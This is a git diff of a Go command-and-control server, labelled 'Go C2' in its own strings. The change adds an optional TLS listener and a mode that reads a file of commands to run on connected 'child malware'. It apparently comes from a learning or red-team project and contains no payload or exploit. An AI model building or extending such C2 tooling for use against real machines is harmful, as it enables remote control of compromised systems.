@@ -15,6 +15,7 @@ import (
 	"flag"
 	"fmt"
 	"io/ioutil"
+	"log"
 	"net"
 	"os"
 	"strings"
@@ -41,6 +42,7 @@ var (
 	commands    = flag.String("commands", "", "Execute a list of commands from a file. Include file name eg: commands commands.txt")
 	loggingName = flag.String("log", "", "Log to a json file. eg \"-log logfile\" will log commands to logfile.json")
 	fileInfo    *os.FileInfo
+	tlsOn       = flag.Bool("tls", false, "Will add TLS to the network traffic")
 	skipEnter   = flag.Bool("skip", false, "Will skip Enter requirement and run automatically, speeds testing")
 )
 
@@ -89,35 +91,35 @@ func logToFile(outputTest *Results) {
 
 }
 
-func listMode(fileToRead string) {
+func listMode(fileToRead string, c net.Conn) {
 	/* Takes a list of commands from a file, reads it in line by line
 	and executes the commands on the child malware.
 	*/
-	fmt.Println("Go C2 will run in Command List Mode")
-	fmt.Println("Please note, Command List Mode does not use TLS")
-	fmt.Println("Admin interface will listen on: ", *connect)
+	// fmt.Println("Go C2 will run in Command List Mode")
+	// fmt.Println("Please note, Command List Mode does not use TLS")
+	// fmt.Println("Admin interface will listen on: ", *connect)
 
-	if *skipEnter == false {
-		reader := bufio.NewReader(os.Stdin)
-		fmt.Println("<PRESS ENTER TO CONTINUE>")
-		_, _ = reader.ReadString('\n')
-	}
+	// if *skipEnter == false {
+	// 	reader := bufio.NewReader(os.Stdin)
+	// 	fmt.Println("<PRESS ENTER TO CONTINUE>")
+	// 	_, _ = reader.ReadString('\n')
+	// }
 
-	fmt.Println("Listening on ", *connect)
-	l, err := net.Listen("tcp", *connect)
-	if err != nil {
-		fmt.Println(err)
-		return
-	}
+	// fmt.Println("Listening on ", *connect)
+	// l, err := net.Listen("tcp", *connect)
+	// if err != nil {
+	// 	fmt.Println(err)
+	// 	return
+	// }
 
-	fmt.Println("WAITING ON CONNECTION")
+	// fmt.Println("WAITING ON CONNECTION")
 
-	c, err := l.Accept()
-	if err != nil {
-		fmt.Println(err)
-		return
-	}
-	fmt.Println("Connect the Child Malware to: ", *connect)
+	// c, err := l.Accept()
+	// if err != nil {
+	// 	fmt.Println(err)
+	// 	return
+	// }
+
 	//read in files
 	fmt.Println("Reading commands from: ", fileToRead)
 	file, err := os.Open(fileToRead)
@@ -177,6 +179,66 @@ func checkError(err error) {
 	}
 }
 
+func connectTLS() net.Conn {
+	fmt.Println("###PRINTING TO SCREENONLY FOR DEV PURPOSES###")
+	// fmt.Printf("Using %s mode \n", *mode)
+
+	var c net.Conn
+	var l net.Listener
+
+	if *commands != "" {
+		fmt.Println("Go C2 will run in Command List Mode")
+		fmt.Println("Please note, Command List Mode does not use TLS")
+		fmt.Println("Admin interface will listen on: ", *connect)
+		fmt.Println("Connect the Child Malware to: ", *connect)
+
+		if *skipEnter == false {
+			reader := bufio.NewReader(os.Stdin)
+			fmt.Println("<PRESS ENTER TO CONTINUE>")
+			_, _ = reader.ReadString('\n')
+		}
+	}
+
+	if *tlsOn == true {
+
+		cert, err := tls.LoadX509KeyPair("../openssl/mydomain.com.crt", "../openssl/mydomain.com.key")
+		checkError(err)
+		config := tls.Config{Certificates: []tls.Certificate{cert}, InsecureSkipVerify: true}
+
+		l, _ = tls.Listen("tcp", *connect, &config)
+
+	} else {
+		l, _ = net.Listen("tcp", *connect)
+		// checkError(err)
+		// if err != nil {
+		// 	fmt.Println(err)
+
+		// }
+	}
+	fmt.Println("===ADMIN SERVER LISTENING ===")
+	defer l.Close()
+
+	c, _ = l.Accept()
+	e := c.(*tls.Conn).Handshake()
+	if e != nil {
+		log.Fatal(e.Error())
+	}
+	// }
+	fmt.Println("PARENT CONNECTED")
+
+	// CA_Pool := x509.NewCertPool()
+	// severCert, err := ioutil.ReadFile("../openssl/mydomain.com.crt")
+	// if err != nil {
+	// 	log.Fatal("Could not load server certificate!")
+	// }
+	// CA_Pool.AppendCertsFromPEM(severCert)
+
+	// config := tls.Config{RootCAs: CA_Pool}
+
+	// need to add parent mode LISTEN
+	return c
+}
+
 func main() {
 	//parsing flags
 	flag.Parse()
@@ -214,33 +276,34 @@ func main() {
 		// 	fmt.Println(err)
 		// 	return
 		// }
-		listMode(*commands)
+		listMode(*commands, connectTLS())
 
 	} else {
-		cert, err := tls.LoadX509KeyPair("C:\\Users\\haydn\\Desktop\\hackers\\blackhatgo\\src\\RTV\\openssl\\mydomain.com.crt", "C:\\Users\\haydn\\Desktop\\hackers\\blackhatgo\\src\\RTV\\openssl\\mydomain.com.key")
-		checkError(err)
-		config := tls.Config{Certificates: []tls.Certificate{cert}, InsecureSkipVerify: true}
+		// cert, err := tls.LoadX509KeyPair("../openssl/mydomain.com.crt", "../openssl/mydomain.com.key")
+		// checkError(err)
+		// config := tls.Config{Certificates: []tls.Certificate{cert}, InsecureSkipVerify: true}
 
-		l, err := tls.Listen("tcp", *connect, &config)
-		// l, err := net.Listen("tcp", *connect)
-		checkError(err)
-		if err != nil {
-			fmt.Println(err)
-			return
-		}
+		// l, err := tls.Listen("tcp", *connect, &config)
+		// fmt.Println(reflect.TypeOf(l))
+		// // l, err := net.Listen("tcp", *connect)
+		// checkError(err)
+		// if err != nil {
+		// 	fmt.Println(err)
+		// 	return
+		// }
 
-		fmt.Println("===ADMIN SERVER LISTENING ===")
-		defer l.Close()
+		// fmt.Println("===ADMIN SERVER LISTENING ===")
+		// defer l.Close()
 
-		c, err := l.Accept()
-		if err != nil {
-			fmt.Println(err)
-			return
-		}
+		// c, err := l.Accept()
+		// if err != nil {
+		// 	fmt.Println(err)
+		// 	return
+		// }
 		// fmt.Println(reflect.TypeOf(c))
 
-		fmt.Println("PARENT CONNECTED")
-
+		// fmt.Println("PARENT CONNECTED")
+		c := connectTLS()
 		//LOOPING for read and writing sockets in NORMAL Mode
 
 		for {
